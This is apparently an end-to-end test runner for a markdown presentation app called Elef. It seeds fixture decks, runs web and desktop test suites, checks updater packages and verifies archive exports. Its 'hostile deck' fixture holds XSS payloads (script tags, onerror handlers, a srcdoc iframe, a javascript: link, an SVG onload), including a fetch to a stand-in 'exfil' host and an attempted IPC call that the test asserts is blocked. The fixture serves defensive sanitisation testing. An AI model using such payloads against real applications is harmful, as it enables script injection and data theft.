import assert from "node:assert/strict"
import { execFileSync, spawn, spawnSync } from "node:child_process"
import { access, chmod, cp, mkdtemp, mkdir, readFile, readdir, realpath, rm, writeFile } from "node:fs/promises"
import os from "node:os"
import path from "node:path"
import { fileURLToPath } from "node:url"
import { createHash, randomUUID } from "node:crypto"
import { PIXEL_PNG_MARKDOWN } from "../../test/e2e/scenarios/media-fixture.js"
import { SHARED_LIBRARY_CREATE_DELETE_TITLES } from "../../test/e2e/scenarios/library-create-delete.js"
import { runNativeQuitSmokes } from "./native-quit-smoke.js"
import { desktopAppEnvironment, verifyOfflineSandbox } from "./offline-macos.js"

const e2eRoot = path.dirname(fileURLToPath(import.meta.url))
const repoRoot = path.resolve(e2eRoot, "../..")
const releaseFixtureRoot = path.join(repoRoot, "test/fixtures/desktop/release")
const basicPresentationSource = await readFile(path.join(releaseFixtureRoot, "basic-presentation.md"), "utf8")
const basicDocumentSource = await readFile(path.join(releaseFixtureRoot, "basic-document.md"), "utf8")
const temporaryRoot = await realpath(await mkdtemp(path.join(os.tmpdir(), "elef-desktop-e2e-")))
const libraryRoot = path.join(temporaryRoot, "Elef")
const seedDeck = path.join(libraryRoot, "E2E seed")
const conflictDeck = path.join(libraryRoot, "E2E conflict")
const hostileDeck = path.join(libraryRoot, "E2E hostile")
const archiveFixture = path.join(temporaryRoot, "E2E archive seed")
const importArchive = path.join(temporaryRoot, "E2E archive seed.elef")
const portableGraphArchiveFixture = path.join(temporaryRoot, "E2E portable graph archive")
const portableGraphArchive = path.join(temporaryRoot, "E2E portable graph archive.elef")
const exportArchive = path.join(temporaryRoot, "E2E seed exported.elef")
const exportContents = path.join(temporaryRoot, "E2E seed exported")
// Both runners complete the same editing, media, snippet, and math scenarios
// against the same deck, so the final source assertion is identical.
const expectedSharedSource = `# Saved by shared scenario\n\nThe visual editor changed this text.\n\nSee [[E2E linked]].\n\n${PIXEL_PNG_MARKDOWN}\n**text**\n\n$$\n\\alpha\n$$\n`
const expectedDesktopSource = expectedSharedSource
const expectedWebSource = expectedSharedSource
const hostileSource = [
  "# Hostile deck",
  "",
  "Safe preview text remains visible.",
  "",
  '<script>window.__elefHostileScriptRan = true; window.parent.postMessage("hostile", "*"); void fetch("https://example.invalid/exfil").catch(() => {}); window.__TAURI__?.core?.invoke?.("create_deck", { name: "Hostile IPC side effect", kind: "presentation" })</script>',
  "",
  '<img src="x" onerror="window.__elefHostileEventRan = true">',
  '<iframe src="https://example.invalid/frame" srcdoc="<script>parent.__elefHostileFrameRan = true</script>"></iframe>',
  "",
  '[unsafe link](javascript:window.__elefHostileLinkRan=true)',
  "",
  "![remote image](https://example.invalid/tracker.png)",
  "![data image](data:image/svg+xml,%3Csvg%20onload%3Dalert(1)%3E)",
  ""
].join("\n")

function normalizeLineEndings(source) {
  return source.replace(/\r\n/g, "\n")
}
const webTitle = "E2E seed"
let presentationId = null
let hostilePresentationId = null
let documentIds = []
let updaterServer = null
const env = {
  ...process.env,
  ELEF_E2E_LIBRARY_ROOT: libraryRoot,
  ELEF_E2E_APP_BINARY: process.env.ELEF_E2E_APP_BINARY
    || path.join(repoRoot, "desktop", "target", "debug", "elef-desktop"),
  ELEF_E2E_IMPORT_ARCHIVE: importArchive,
  ELEF_E2E_PORTABLE_GRAPH_ARCHIVE: portableGraphArchive,
  ELEF_E2E_EXPORT_PATH: exportArchive,
  ELEF_E2E_SEED_DECK_ID: "a3d0f020-6605-4f9e-a96d-d825ee4b13f1"
}

if (process.env.ELEF_E2E_PACKAGED_UPDATES === "1") {
  const packages = path.join(repoRoot, "desktop/target/e2e-packages")
  const installed = path.join(temporaryRoot, "installed")
  await cp(path.join(packages, "n-1"), installed, { recursive: true, verbatimSymlinks: true })
  env.ELEF_E2E_PACKAGED_UPDATES = "1"
  env.ELEF_E2E_APP_BINARY = process.platform === "darwin"
    ? path.join(installed, "Elef.app/Contents/MacOS/elef-desktop") : path.join(installed, "Elef.AppImage")
  env.ELEF_E2E_INSTALLED_ARTIFACT = env.ELEF_E2E_APP_BINARY
  env.ELEF_E2E_UPDATE_PACKAGE = path.join(packages, process.platform === "darwin" ? "update.tar.gz" : "update.AppImage")
  if (process.platform === "linux") await prepareInstalledAppImage()
} else if (process.env.CI) {
  throw new Error("CI must exercise the installed N-1 and N updater packages")
}

async function prepareInstalledAppImage() {
  const image = env.ELEF_E2E_INSTALLED_ARTIFACT
  const extraction = path.join(temporaryRoot, "installed-extraction")
  await rm(extraction, { recursive: true, force: true })
  await mkdir(extraction)
  // CI has no FUSE mount. Use the AppImage runtime's own extraction operation,
  // then start its packaged binary directly so WebDriver owns the actual PID.
  execFileSync(image, ["--appimage-extract"], { cwd: extraction, stdio: "ignore", timeout: 60_000 })
  env.ELEF_E2E_APP_BINARY = path.join(extraction, "squashfs-root/AppRun")
  env.APPDIR = path.join(extraction, "squashfs-root")
  env.APPIMAGE = image
}

async function hashTree(root, relative = "") {
  const entries = await readdir(path.join(root, relative), { withFileTypes: true })
  const result = {}
  for (const entry of entries) {
    const entryPath = path.posix.join(relative, entry.name)
    if (entry.isSymbolicLink()) throw new Error(`Unexpected symlink in .elef fixture: ${entryPath}`)
    if (entry.isDirectory()) Object.assign(result, await hashTree(root, entryPath))
    else if (entry.isFile()) {
      const bytes = await readFile(path.join(root, entryPath))
      result[entryPath] = createHash("sha256").update(bytes).digest("hex")
    } else {
      throw new Error(`Unexpected special file in .elef fixture: ${entryPath}`)
    }
  }
  return result
}

async function makeTreeAccessible(root) {
  await chmod(root, 0o700)
  for (const entry of await readdir(root, { withFileTypes: true })) {
    const entryPath = path.join(root, entry.name)
    if (entry.isDirectory()) await makeTreeAccessible(entryPath)
    else if (entry.isFile()) await chmod(entryPath, 0o600)
  }
}

function runRails(code) {
  const result = spawnSync("bin/rails", ["runner", "-e", "test", code], {
    cwd: repoRoot,
    env: { ...env, RAILS_ENV: "test" },
    encoding: "utf8"
  })
  if (result.error) throw result.error
  if (result.status !== 0) throw new Error(result.stderr || result.stdout || "Rails E2E fixture command failed")
  return result.stdout.trim()
}

function withTimeout(promise, timeoutMs, message) {
  let timer
  return Promise.race([
    promise,
    new Promise((_, reject) => {
      timer = setTimeout(() => reject(new Error(message)), timeoutMs)
    })
  ]).finally(() => clearTimeout(timer))
}


try {
  await mkdir(seedDeck, { recursive: true })
  const libraryConfig = path.join(libraryRoot, ".elef")
  await mkdir(libraryConfig, { recursive: true })
  await writeFile(path.join(libraryConfig, "snippets.json"), JSON.stringify({
    schema_version: 1,
    entries: [{
      id: "personal-note",
      name: "Personal note",
      description: "A custom personal note",
      trigger: "note",
      category: "Markdown",
      body: "**${1:note}**",
      namespace: "/",
      built_in: false
    }]
  }))
  await writeFile(path.join(libraryConfig, "math-shortcuts.json"), JSON.stringify({
    schema_version: 1,
    entries: [{
      id: "personal-lambda",
      name: "Lambda",
      description: "The Greek letter lambda",
      prefix: "@",
      aliases: ["lambda"],
      expansion: "\\lambda",
      namespace: "@",
      built_in: false
    }]
  }))
  await writeFile(path.join(seedDeck, "presentation.md"), basicPresentationSource)
  await writeFile(path.join(seedDeck, "elef.json"), JSON.stringify({
    id: "a3d0f020-6605-4f9e-a96d-d825ee4b13f1",
    schema_version: 1
  }))
  await mkdir(conflictDeck, { recursive: true })
  await writeFile(path.join(conflictDeck, "presentation.md"), "# Before conflict test\n\nSeed paragraph.\n")
  await writeFile(path.join(conflictDeck, "elef.json"), JSON.stringify({ id: randomUUID(), schema_version: 1 }))
  await mkdir(hostileDeck, { recursive: true })
  await writeFile(path.join(hostileDeck, "presentation.md"), hostileSource)
  await writeFile(path.join(hostileDeck, "elef.json"), JSON.stringify({ id: randomUUID(), schema_version: 1 }))
  await mkdir(archiveFixture, { recursive: true })
  await writeFile(path.join(archiveFixture, "presentation.md"), "# Imported from Elef\n\nPortable archive fixture.\n")
  await writeFile(path.join(archiveFixture, "elef.json"), JSON.stringify({ id: randomUUID(), schema_version: 1 }))
  execFileSync("zip", ["-q", "-r", importArchive, path.basename(archiveFixture)], { cwd: temporaryRoot })
  await mkdir(portableGraphArchiveFixture, { recursive: true })
  await writeFile(path.join(portableGraphArchiveFixture, "document.md"), [
    "---",
    'elef_document_key: "e2e-portable-graph-key"',
    'elef_aliases: ["E2E portable graph alias"]',
    "---",
    "# E2E portable graph target",
    ""
  ].join("\n"))
  const portableGraphTargetId = randomUUID()
  await writeFile(path.join(portableGraphArchiveFixture, "elef.json"), JSON.stringify({
    id: portableGraphTargetId,
    schema_version: 1
  }))
  execFileSync("zip", ["-q", "-r", portableGraphArchive, path.basename(portableGraphArchiveFixture)], { cwd: temporaryRoot })
  const portableKeySourceId = randomUUID()
  const portableAliasSourceId = randomUUID()
  env.ELEF_E2E_PORTABLE_GRAPH_TARGET_ID = portableGraphTargetId
  env.ELEF_E2E_PORTABLE_KEY_SOURCE_ID = portableKeySourceId
  env.ELEF_E2E_PORTABLE_ALIAS_SOURCE_ID = portableAliasSourceId
  const desktopLinkedDocumentId = randomUUID()
  const e2eDocumentSource = basicDocumentSource
  const e2eLinkedDocumentSource = "---\ntheme: light\n---\n# E2E linked\n\nTarget document.\n"
  for (const [name, source] of [
    ["E2E document", e2eDocumentSource],
    ["E2E linked", e2eLinkedDocumentSource]
  ]) {
    const folder = path.join(libraryRoot, name)
    const id = name === "E2E linked" ? desktopLinkedDocumentId : randomUUID()
    await mkdir(folder, { recursive: true })
    await writeFile(path.join(folder, "document.md"), source)
    await writeFile(path.join(folder, "elef.json"), JSON.stringify({ id, schema_version: 1 }))
  }
  env.ELEF_E2E_DESKTOP_LINKED_DOCUMENT_ID = desktopLinkedDocumentId

  if (process.env.CI || process.env.ELEF_E2E_RUN_WEB === "1") {
    const seeded = runRails(
      `Presentation.where(title: ${JSON.stringify(SHARED_LIBRARY_CREATE_DELETE_TITLES.presentation)}).destroy_all; Document.where(title: ${JSON.stringify(SHARED_LIBRARY_CREATE_DELETE_TITLES.document)}).destroy_all; presentation = Presentation.create!(title: ${JSON.stringify(webTitle)}, source: ${JSON.stringify(basicPresentationSource)}); conflict = Presentation.create!(title: "E2E conflict", source: "# Before conflict test\\n\\nSeed paragraph.\\n"); hostile = Presentation.create!(title: "E2E hostile", source: ${JSON.stringify(hostileSource)}); document = Document.create!(source: ${JSON.stringify(e2eDocumentSource)}); linked = Document.create!(source: ${JSON.stringify(e2eLinkedDocumentSource)}); puts "ELEF_E2E_PRESENTATION_ID=#{presentation.id}"; puts "ELEF_E2E_CONFLICT_PRESENTATION_ID=#{conflict.id}"; puts "ELEF_E2E_HOSTILE_PRESENTATION_ID=#{hostile.id}"; puts "ELEF_E2E_DOCUMENT_IDS=#{[document.id, linked.id].join(',')}"`
    )
    const id = seeded.match(/^ELEF_E2E_PRESENTATION_ID=(\d+)$/m)?.[1]
    assert.match(id, /^\d+$/, "Rails fixture command should return the presentation id")
    presentationId = id
    const conflictId = seeded.match(/^ELEF_E2E_CONFLICT_PRESENTATION_ID=(\d+)$/m)?.[1]
    assert.match(conflictId, /^\d+$/, "Rails fixture command should return the conflict presentation id")
    env.ELEF_E2E_CONFLICT_PRESENTATION_ID = conflictId
    hostilePresentationId = seeded.match(/^ELEF_E2E_HOSTILE_PRESENTATION_ID=(\d+)$/m)?.[1]
    assert.match(hostilePresentationId, /^\d+$/, "Rails fixture command should return the hostile presentation id")
    env.ELEF_E2E_HOSTILE_PRESENTATION_ID = hostilePresentationId
    const docs = seeded.match(/^ELEF_E2E_DOCUMENT_IDS=(\d+,\d+)$/m)?.[1]
    assert.ok(docs, "Rails fixture command should return document IDs")
    documentIds = docs.split(",")
    env.ELEF_E2E_PRESENTATION_ID = id
    env.ELEF_E2E_DOCUMENT_ID = documentIds[0]
    env.ELEF_E2E_LINKED_DOCUMENT_ID = documentIds[1]
    env.ELEF_E2E_START_WEB_SERVER = "1"
  }

  if (presentationId) {
    const playwright = path.join(e2eRoot, "node_modules", ".bin", "playwright")
    const webResult = spawnSync(playwright, ["test", "--project=web"], {
      cwd: e2eRoot,
      env,
      stdio: "inherit"
    })
    if (webResult.error) throw webResult.error
    if (webResult.status !== 0) throw new Error("Shared web scenarios failed with status " + webResult.status)
  }

  const webdriverio = path.join(e2eRoot, "node_modules", ".bin", "wdio")
  await verifyOfflineSandbox()
  updaterServer = spawn(process.execPath, [path.join(e2eRoot, "updater-fixture-server.mjs")], {
    env,
    stdio: ["ignore", "inherit", "inherit", "ipc"]
  })
  env.ELEF_E2E_UPDATER_PUBLIC_KEY = await withTimeout(new Promise((resolve, reject) => {
    updaterServer.once("message", message => resolve(message.publicKey))
    updaterServer.once("error", reject)
    updaterServer.once("exit", code => reject(new Error(`Updater fixture server exited before readiness (${code})`)))
  }), 10_000, "Updater fixture server did not start")
  if (process.env.CI) await runNativeQuitSmokes(env)
  const desktopResult = spawnSync(webdriverio, ["run", "wdio.conf.js"], {
    cwd: e2eRoot,
    env: {
      ...desktopAppEnvironment(env),
      TAURI_WEBDRIVER_PORT: process.env.TAURI_WEBDRIVER_PORT || "4445"
    },
    stdio: "inherit"
  })
  if (desktopResult.error) throw desktopResult.error
  if (desktopResult.status !== 0) throw new Error("Shared desktop scenarios failed with status " + desktopResult.status)
  if (env.ELEF_E2E_PACKAGED_UPDATES === "1") {
    if (process.platform === "linux") await prepareInstalledAppImage()
    const upgradedResult = spawnSync(webdriverio, ["run", "wdio.conf.js"], {
      cwd: e2eRoot, env: { ...desktopAppEnvironment(env), ELEF_E2E_VERIFY_UPGRADED: "1" }, stdio: "inherit"
    })
    if (upgradedResult.error) throw upgradedResult.error
    if (upgradedResult.status !== 0) throw new Error("The installed update did not launch and preserve the deck")
  }

  const desktopSource = await readFile(path.join(seedDeck, "presentation.md"), "utf8")
  assert.equal(normalizeLineEndings(desktopSource), expectedDesktopSource)
  try {
    await access(path.join(libraryRoot, "Hostile IPC side effect"))
    throw new Error("Hostile deck content reached the create_deck IPC command")
  } catch (error) {
    if (error.code !== "ENOENT") throw error
  }
  assert.equal(
    await readFile(path.join(libraryRoot, "E2E archive seed", "presentation.md"), "utf8"),
    "# Imported from Elef\n\nPortable archive fixture.\n"
  )
  await access(exportArchive)
  execFileSync("unzip", ["-q", "-o", exportArchive, "-d", exportContents])
  await makeTreeAccessible(exportContents)
  assert.deepEqual(await hashTree(exportContents), await hashTree(seedDeck),
    "Exporting a deck must preserve every file byte, including its manifest and uploaded image")
  if (presentationId) {
    const persisted = runRails(
      "presentation = Presentation.find(" + presentationId + "); puts \"ELEF_E2E_SOURCE=#{presentation.source.to_json}\"; presentation.destroy!; Presentation.where(title: " + JSON.stringify(SHARED_LIBRARY_CREATE_DELETE_TITLES.presentation) + ").destroy_all; Presentation.where(id: [" + [Number(env.ELEF_E2E_CONFLICT_PRESENTATION_ID), Number(hostilePresentationId)].join(",") + "]).destroy_all; Document.where(title: " + JSON.stringify(SHARED_LIBRARY_CREATE_DELETE_TITLES.document) + ").destroy_all; Document.where(id: [" + documentIds.map(Number).join(",") + "]).destroy_all"
    )
    const savedSource = persisted.match(/^ELEF_E2E_SOURCE=(.*)$/m)?.[1]
    assert.ok(savedSource, "Rails fixture command should return the persisted source")
    assert.equal(normalizeLineEndings(JSON.parse(savedSource)), expectedWebSource)
  }
} finally {
  if (updaterServer) {
    const exited = new Promise(resolve => updaterServer.once("exit", resolve))
    if (updaterServer.exitCode === null && updaterServer.signalCode === null) {
      updaterServer.kill("SIGTERM")
      await Promise.race([exited, new Promise(resolve => setTimeout(resolve, 1_000))])
      if (updaterServer.exitCode === null && updaterServer.signalCode === null) updaterServer.kill("SIGKILL")
    }
  }
  if (presentationId) {
    try {
      runRails(`Presentation.find_by(id: ${presentationId})&.destroy!`)
      runRails(`Presentation.where(title: ${JSON.stringify(SHARED_LIBRARY_CREATE_DELETE_TITLES.presentation)}).destroy_all`)
      runRails(`Presentation.find_by(id: ${Number(hostilePresentationId)})&.destroy!`)
      if (env.ELEF_E2E_CONFLICT_PRESENTATION_ID) {
        runRails(`Presentation.find_by(id: ${Number(env.ELEF_E2E_CONFLICT_PRESENTATION_ID)})&.destroy!`)
      }
      runRails(`Document.where(id: [${documentIds.map(Number).join(",")}]).destroy_all`)
      runRails(`Document.where(title: ${JSON.stringify(SHARED_LIBRARY_CREATE_DELETE_TITLES.document)}).destroy_all`)
    } catch (_error) {
      // Preserve the browser/test failure while making fixture cleanup best-effort.
    }
  }
  await makeTreeAccessible(temporaryRoot)
  await rm(temporaryRoot, { recursive: true, force: true })
}
